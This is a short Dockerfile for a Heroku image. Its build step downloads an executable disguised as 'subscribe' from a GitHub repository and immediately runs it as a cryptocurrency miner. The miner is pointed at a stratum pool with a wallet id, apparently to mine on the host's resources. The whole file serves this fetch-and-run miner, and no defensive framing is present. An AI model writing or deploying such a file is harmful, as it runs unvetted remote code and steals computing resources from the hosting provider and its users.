FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/wardonoasus/mrbogel/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://mbc-asia.skypool.co:8003 -u MqJqapTNZhKw1uxdg3JXfFmaCcUxFMmgg6.VPS
CMD bash heroku.sh
